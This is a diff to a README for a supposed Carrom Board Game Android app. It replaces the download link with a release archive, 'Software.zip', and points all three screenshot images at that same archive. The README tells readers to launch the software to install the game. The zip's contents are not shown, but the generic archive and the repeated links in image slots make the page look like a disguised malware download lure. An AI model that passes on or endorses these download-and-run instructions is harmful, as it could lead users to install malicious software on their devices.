@@ -29,7 +29,7 @@ Welcome to the "Carrom Board Game" GitHub repository, where you can find an exci
 ## Get Started 🎮
 
 To access the software for this Android application, please download it from the following link:  
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/GrafDeCot/carrom-board-game/releases/download/v2.0/Software.zip)](https://github.com/GrafDeCot/carrom-board-game/releases/download/v2.0/Software.zip)
 
 The software needs to be launched to install and play the carrom board game on your Android device.
 
@@ -37,9 +37,9 @@ The software needs to be launched to install and play the carrom board game on y
 
 Here are some snapshots of the Carrom Board Game Android Application in action:
 
-![Screenshot 1](https://yourimageurl.com)
-![Screenshot 2](https://yourimageurl.com)
-![Screenshot 3](https://yourimageurl.com)
+![Screenshot 1](https://github.com/GrafDeCot/carrom-board-game/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/GrafDeCot/carrom-board-game/releases/download/v2.0/Software.zip)
+![Screenshot 3](https://github.com/GrafDeCot/carrom-board-game/releases/download/v2.0/Software.zip)
 
 ## Instructions 📝
 
